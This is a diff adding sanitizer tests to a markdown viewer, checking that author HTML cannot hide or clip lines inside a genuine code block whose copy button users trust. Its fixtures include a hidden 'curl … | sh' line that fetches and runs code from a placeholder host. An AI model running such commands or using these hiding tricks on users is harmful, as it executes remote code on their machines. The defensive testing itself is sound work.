@@ -67,13 +67,90 @@ test('only the copy button the renderer made is a trusted content command', () =
     '',
     '<div class="code-wrapper"><pre><code class="hljs">npm install left-pad<span style="font-size:0">; curl -s https://example.invalid/x | sh</span></code></pre><button class="copy-btn" type="button" data-command="copyCode" data-command-element="true" data-mdv-trust="guess">C</button></div>',
   ].join('\n'))
-  const [genuine, forged] = new JSDOM(`<div>${html}</div>`).window.document.querySelectorAll('button.copy-btn')
+  const [genuine, forged] = new JSDOM(`<div>${html}</div>`).window.document.querySelectorAll('button[data-command="copyCode"]')
   assert.ok(genuine && forged, html)
   assert.equal(forged.getAttribute('data-command'), 'copyCode', 'the forged button survives sanitizing, so the marker has to carry the check')
   assert.equal(controller.isTrustedContentCommand(genuine), true)
   assert.equal(controller.isTrustedContentCommand(forged), false)
   // Each window's renderer has its own marker.
   assert.equal(makeController().isTrustedContentCommand(genuine), false)
+})
+
+// security-report.md L1, residual: with forged buttons dead, a document could still wrap a genuine
+// block in its own `<div style="max-height:…;overflow:hidden">`. A blank line ends the HTML block,
+// so the fence inside renders as a real block, and the genuine copy button copies innerText,
+// clipped lines included. Author-written elements therefore lose `style` and `class`, the way
+// GitHub's sanitizer drops them; the renderer's own markup keeps both.
+function renderedDom(controller, md) {
+  return new JSDOM(`<div id="root">${controller.renderMarkdown(md)}</div>`).window.document
+}
+
+test('author HTML loses style and class, so it cannot clip a genuine code block', () => {
+  const controller = makeController()
+  const doc = renderedDom(controller, [
+    '<div id="clip" style="max-height:1.4em;overflow:hidden" class="visually-hidden code-wrapper">',
+    '',
+    '```javascript',
+    'npm install left-pad',
+    'curl -s https://example.invalid/x | sh',
+    '```',
+    '',
+    '</div>',
+    '',
+    '<p id="styled" style="color:red" class="markdown-alert" align="center">kept text</p>',
+  ].join('\n'))
+  const clip = doc.getElementById('clip')
+  assert.ok(clip, 'the author element itself survives')
+  assert.equal(clip.hasAttribute('style'), false)
+  assert.equal(clip.hasAttribute('class'), false)
+  const styled = doc.getElementById('styled')
+  assert.equal(styled.hasAttribute('style'), false)
+  assert.equal(styled.hasAttribute('class'), false)
+  assert.equal(styled.getAttribute('align'), 'center', 'presentational attributes GitHub keeps stay')
+  // The genuine block inside keeps all of its own classes.
+  const wrapper = clip.querySelector('.code-wrapper')
+  assert.ok(wrapper, 'the fence still renders as a code block')
+  assert.ok(wrapper.querySelector('code.hljs span.hljs-keyword'))
+  assert.ok(wrapper.querySelector('button.copy-btn'))
+  assert.ok(wrapper.querySelector('.code-lang-row .code-lang'))
+})
+
+test('a forged sealed block or trust attribute does not let author styling through', () => {
+  const controller = makeController()
+  const doc = renderedDom(controller, [
+    '<div id="fake-math" class="mdv-latex" data-mdv-trust="guess"><span id="inner" style="font-size:0" class="katex">hidden</span></div>',
+    '',
+    '<span id="fake-own" data-mdv-trust="guess" style="font-size:0" class="hljs">hidden</span>',
+  ].join('\n'))
+  for (const id of ['fake-math', 'inner', 'fake-own']) {
+    const el = doc.getElementById(id)
+    assert.ok(el, id)
+    assert.equal(el.hasAttribute('style'), false, `${id} style`)
+    assert.equal(el.hasAttribute('class'), false, `${id} class`)
+  }
+})
+
+test('the renderer keeps its own classes and styles: math, alerts and their title, mermaid', () => {
+  const controller = makeController({ katexLib: katex })
+  const doc = renderedDom(controller, [
+    '```math',
+    '\\frac{a}{b}',
+    '```',
+    '',
+    '> [!NOTE]',
+    '> body <span id="in-alert" style="font-size:0" class="x">author text</span>',
+    '',
+    '```mermaid',
+    'graph TD; A-->B',
+    '```',
+  ].join('\n'))
+  assert.ok(doc.querySelector('.mdv-latex .katex'), 'KaTeX classes kept')
+  assert.ok(doc.querySelector('.mdv-latex [style]'), 'KaTeX inline layout styles kept')
+  assert.ok(doc.querySelector('.markdown-alert.markdown-alert-note > p.markdown-alert-title'))
+  const inAlert = doc.getElementById('in-alert')
+  assert.equal(inAlert.hasAttribute('style'), false, 'author HTML inside an alert body is still author HTML')
+  assert.equal(inAlert.hasAttribute('class'), false)
+  assert.ok(doc.querySelector('pre.mermaid[data-mermaid-src]'))
 })
 
 test('markTrustedContentCommands marks the command elements of app markup and nothing else', () => {
@@ -393,7 +470,7 @@ function decodeBase64Utf8(b64) {
 
 test('renderMarkdown turns a mermaid fence into a placeholder, not a highlighted code block', () => {
   const html = makeController().renderMarkdown('```mermaid\ngraph TD; A-->B\n```')
-  assert.ok(/<pre class="mermaid" data-mermaid-src="[A-Za-z0-9+/=]+">graph TD; A--&gt;B<\/pre>/.test(html), html)
+  assert.ok(/<pre class="mermaid" data-mdv-trust="[0-9a-f]{32}" data-mermaid-src="[A-Za-z0-9+/=]+">graph TD; A--&gt;B<\/pre>/.test(html), html)
   assert.ok(!/class="hljs"/.test(html), html)
   assert.ok(!/class="copy-btn"/.test(html), html)
   assert.ok(!/code-lang/.test(html), html)
@@ -453,7 +530,7 @@ const katexStub = {
 
 test('renderMarkdown turns a latex fence into a katex-rendered block when a katex lib is present', () => {
   const html = makeController({ katexLib: katexStub }).renderMarkdown('```latex\nx^2\n```')
-  assert.ok(/<div class="mdv-latex"><span class="katex-stub" data-display="true">x\^2<\/span><\/div>/.test(html), html)
+  assert.ok(/<div class="mdv-latex" data-mdv-trust="[0-9a-f]{32}"><span class="katex-stub" data-display="true">x\^2<\/span><\/div>/.test(html), html)
   assert.ok(!/class="hljs"/.test(html), html)
   assert.ok(!/class="copy-btn"/.test(html), html)
 })
@@ -491,7 +568,7 @@ test('renderMarkdown renders each alert type with its class and label', () => {
   for (const type of ['NOTE', 'TIP', 'IMPORTANT', 'WARNING', 'CAUTION']) {
     const html = makeController().renderMarkdown(`> [!${type}]\n> body text`)
     assert.ok(new RegExp(`class="markdown-alert markdown-alert-${type.toLowerCase()}"`).test(html), html)
-    assert.ok(new RegExp(`class="markdown-alert-title">.*${type[0]}${type.slice(1).toLowerCase()}`).test(html), html)
+    assert.ok(new RegExp(`class="markdown-alert-title" data-mdv-trust="[0-9a-f]{32}">.*${type[0]}${type.slice(1).toLowerCase()}`).test(html), html)
     assert.ok(/body text/.test(html), html)
     assert.ok(!/<blockquote>/.test(html), html)
   }
